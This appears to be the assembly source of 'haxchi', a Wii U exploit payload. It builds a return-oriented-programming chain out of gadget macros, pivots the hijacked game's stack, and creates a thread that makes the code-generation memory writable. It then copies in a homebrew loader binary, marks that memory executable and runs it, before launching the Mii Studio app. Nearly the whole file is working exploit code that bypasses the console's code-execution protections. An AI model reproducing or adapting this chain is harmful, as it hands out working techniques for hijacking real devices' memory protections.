.include "coreinit.s"
.include "defines.s"

; more useful definitions
CODEGEN_ADR equ (0x01800000)

NERD_THREAD0OBJECT equ (HAX_TARGET_ADDRESS - 0x1000)
NERD_THREAD2OBJECT equ (HAX_TARGET_ADDRESS - 0x2000)

.macro set_sp,v
	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
		.word 0xDEADBABE ; r30
		.word v ; r31
		.word 0xDEAD0001 ; garbage
	.word MR_R11R31_LMW_R26R1x8_LWZ_R0x24_MTLR_R0_ADDI_R1x20_CLRLWI_R3R11x18_BLR
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
		.word 0xDEAD0001 ; garbage
	.word LWZ_R0R11x4_R31R11xM4_MTLR_R0_MR_R1R11_BLR
.endmacro

.macro call_func,f,arg1,arg2,arg3,arg4
	.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR
		.word 0xDEAD0001 ; garbage
		.word 0xDEADBABE ; r21
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word 0xDEADBABE ; r24
		.word 0xDEADBABE ; r25
		.word 0xDEADBABE ; r26
		.word f ; r27 (ctr)
		.word arg4 ; r28 (r6)
		.word arg3 ; r29 (r5)
		.word arg2 ; r30 (r4)
		.word arg1 - 2 ; r31 (r3 - 2)
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR
		.word 0xDEAD0008 ; garbage
		.word 0xDEAD000C ; garbage
		.word 0xDEAD0010 ; garbage
		.word 0xDEAD0014 ; garbage
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
	; final sp is here
		.word 0xDEADBABE ; garbage
.endmacro

.macro call_func_6args,f,arg1,arg2,arg3,arg4,arg5,arg6
	.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR
		.word 0xDEAD0001 ; garbage
		.word arg6 ; r21 (r8)
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word arg1 ; r24 (r3)
		.word arg2 ; r25 (r4)
		.word 0xDEADBABE ; r26
		.word arg3 ; r27 (r5)
		.word arg4 ; r28 (r6)
		.word arg5 ; r29 (r7)
		.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR ; r30 (ctr)
		.word 0xDEADBABE ; r31
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R30_MR_R8R21_R7R29_R6R28_R5R27_R4R25_R3R24_BCTRL
		.word 0xDEAD0001 ; garbage
		.word 0xDEADBABE ; r21
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word 0xDEADBABE ; r24
		.word 0xDEADBABE ; r25
		.word 0xDEADBABE ; r26
		.word f ; r27 (ctr)
		.word arg4 ; r28 (r6)
		.word arg3 ; r29 (r5)
		.word arg2 ; r30 (r4)
		.word arg1 - 2 ; r31 (r3 - 2)
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR
		.word 0xDEAD0008 ; garbage
		.word 0xDEAD000C ; garbage
		.word 0xDEAD0010 ; garbage
		.word 0xDEAD0014 ; garbage
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
	; final sp is here
		.word 0xDEADBABE ; garbage
.endmacro


; hacked from arm7 ram offset (unsafe, game stack pointer)
.create "haxchi_rop_hook.bin", HAX_TARGET_ADDRESS
.arm.big

rop_hook_start:
	;call_func BCTRL, 0x0, 0x0, 0x0, 0x0 ; infinite loop
	;call_func OSFATAL, 0x1007E7A8, 0, 0, 0
	; move stack pointer to safe area
	set_sp (rop_start - 4)
.Close


; original game arm9 ram offset (safe, normally arm9 code)
.create "haxchi_rop.bin", ARM9_ROM_LOCATION
.arm.big

rop_start:
	; do hachihachi cleanups so we can use everything safely
	call_func HACHI_APPLICATION_SHUTDOWNANDDESTROY, HACHI_APPLICATION_PTR, 0, 0, 0
	call_func NERD_FASTWIIU_SHUTDOWN, 0, 0, 0, 0
	call_func CORE_SHUTDOWN, 0, 0, 0, 0

	; set up hbl_loader in core 0
	call_func_6args NERD_CREATETHREAD, NERD_THREAD0OBJECT, LWZ_R0xAFC_MTLR_R0_ADDI_R1xAF8_BLR, 0x1007E7A8, thread0_param, 0x0, 0x0

	; the code below prepares the stack for the thread in core 0

	; load memcpy jump into r3
	.word LWZ_R3_8_R1_LWZ_R0x14_MTLR_R0_ADDI_R1x10_BLR
		.word MEMCPY ; r3
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
	; more r3 into r12 for our memcpy jump at the end of this
	.word MR_R12_R3_CMPLW_R12_R0_LI_R3_0_BEQ_ADDI_R3_R12x10_LWZ_R0_R1x14_MTLR_R0_ADDI_R1x10_BLR
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
	; prepare r31 to be a valid value for the next call
	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
		.word 0xDEADBABE ; r30
		.word (core0rop_end - core0rop) ; r31 (has to be the same as r5 in the next call)
		.word 0xDEAD0001 ; garbage
	; get r5 ready for the length we want to copy
	.word LWZ_R5_R1x8_CMPLW_R5_R31_BNE_MR_R3_R5_LWZ_R0_R1x1C_LWZ_R30_R1x10_MTLR_R0_LWZ_R31_R1x14_ADDI_R1x18_BLR
		.word (core0rop_end - core0rop) ; r5
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; r30
		.word 0xDEAD0001 ; r31
		.word 0xDEAD0001 ; garbage
	; get r4 ready for the data we want to copy
	.word LWZ_R4_R1xC_STW_R12_R1x8_LWZ_R3_R1x8_LWZ_R0_R1x1C_MTLR_R0_ADDI_R1x18_BLR
		.word 0xDEAD0001 ; garbage
		.word core0rop ; r4
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
	; prepare r31 to be a valid value for the next call
	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
		.word 0xDEADBABE ; r30
		.word (HAX_TARGET_ADDRESS-0x3000) ; r31 (has to be valid here)
		.word 0xDEAD0001 ; garbage
	; loads the required value for the addition onto r3 later on
	.word LWZ_R7_R1x10_LWZ_R8_R1x14_STW_R7_R31x0_STW_R8_R31x0_LWZ_R0_R1x2C_LWZ_R31_R0x24_MTLR_R0_LWZ_R30_R0x20_ADDI_R1x28_BLR
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
		.word (0x00800000 - 0x30 + 0xAFC) ; r7
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; r30
		.word 0xDEAD0001 ; r31
		.word 0xDEAD0001 ; garbage
	; loads pointer to new thread sp into r3
	.word LWZ_R3_8_R1_LWZ_R0x14_MTLR_R0_ADDI_R1x10_BLR
		.word (NERD_THREAD0OBJECT+4) ; r3
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
	; r3 contains new thread sp end after this load
	.word LWZ_R3_4_R3_LWZ_R0xC_MTLR_R0_ADDI_R1x8_BLR
		.word 0xDEAD0001 ; garbage
	; r3 contains code injection thread sp after this add
	.word LWZ_R0_R1x1C_LWZ_R30_R1x10_MTLR_R0_LWZ_R31_R1x14_ADDI_R1x18_ADD_R3_R7_BLR
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; r30
		.word 0xDEAD0001 ; r31
		.word 0xDEAD0001 ; garbage
	; jump to previously prepared r12 for memcpy
	.word MTCTR_R12_BCTRL_LI_R3_0_LWZ_R0_R1x14_LWZ_R31_R1xC_MTLR_R0_ADDI_R1x10_BLR
		.word 0xDEAD0001 ; garbage
		.word 0xDEAD0001 ; r31
		.word 0xDEAD0001 ; garbage

	; thread stack is prepared after this point

	; wait for hbl_loader to do its job
	call_func NERD_STARTTHREAD, NERD_THREAD0OBJECT, 0x0, 0x0, 0x0
	call_func NERD_JOINTHREAD, NERD_THREAD0OBJECT, 0x0, 0x0, 0x0

	; prepare system for foreground release
	call_func OSSAVESDONE_READYTORELEASE, 0, 0, 0, 0

	; instruct all 3 cores to release foreground to prepare mii studio app launch
	call_func_6args NERD_CREATETHREAD, NERD_THREAD0OBJECT, OSRELEASEFOREGROUND, 0, thread0_param, 0x0, 0x0
	call_func NERD_STARTTHREAD, NERD_THREAD0OBJECT, 0x0, 0x0, 0x0

	call_func_6args NERD_CREATETHREAD, NERD_THREAD2OBJECT, OSRELEASEFOREGROUND, 0, thread2_param, 0x0, 0x0
	call_func NERD_STARTTHREAD, NERD_THREAD2OBJECT, 0x0, 0x0, 0x0

	; we are the main thread in core 1 so we call this direct
	call_func OSRELEASEFOREGROUND, 0, 0, 0, 0

	; launch mii studio app
	.word _START_EXIT

	core0rop:
		; switch codegen to RW
		call_func OSCODEGEN_SWITCHSECMODE, 0x0, 0x0, 0x0, 0x0

		; memcpy code
		call_func MEMCPY, CODEGEN_ADR, code, code_end - code, 0x0
		call_func DC_FLUSHRANGE, CODEGEN_ADR, code_end - code, 0x0, 0x0

		; switch codegen to RX
		call_func OSCODEGEN_SWITCHSECMODE, 0x1, 0x0, 0x0, 0x0
		call_func IC_INVALIDATERANGE, CODEGEN_ADR, code_end - code, 0x0, 0x0

		; execute hbl_loader in codegen
		.word CODEGEN_ADR
	core0rop_end:

	; core 0 thread params
	output0_string:
		.ascii "hax0thread"
		.byte 0x00
		.align 0x4

	thread0_param:
		.word output0_string
		.word 0x00800000 ; stack size
		.word 0x00000010 ; thread prio
		.halfword 0x0001 ; thread affinity (core0)

	; core 2 thread params
	output2_string:
		.ascii "hax2thread"
		.byte 0x00
		.align 0x4

	thread2_param:
		.word output2_string
		.word 0x00800000 ; stack size
		.word 0x00000010 ; thread prio
		.halfword 0x0004 ; thread affinity (core2)

	; hbl_loader code
	code:
		.incbin "code550.bin"
	code_end:

.Close
